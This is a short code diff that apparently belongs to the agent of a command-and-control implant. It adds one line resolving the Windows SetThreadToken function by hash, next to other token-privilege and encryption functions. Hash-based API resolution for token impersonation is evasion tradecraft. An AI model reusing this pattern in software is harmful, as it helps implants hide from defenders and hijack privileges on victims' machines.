@@ -389,6 +389,7 @@ VOID DxInitialization( VOID )
         Instance->Win32.AdjustTokenPrivileges               = LdrFunctionAddr( Instance->Modules.Advapi32, 0xce4cd9cb );
         Instance->Win32.LookupPrivilegeNameA                = LdrFunctionAddr( Instance->Modules.Advapi32, 0xe6176fe8 );
         Instance->Win32.SystemFunction032                   = LdrFunctionAddr( Instance->Modules.Advapi32, 0xcccf3585 );
+        Instance->Win32.SetThreadToken                      = LdrFunctionAddr( Instance->Modules.Advapi32, 0x575b17ca );
 
         PUTS( "Loaded Advapi32 functions" )
     }
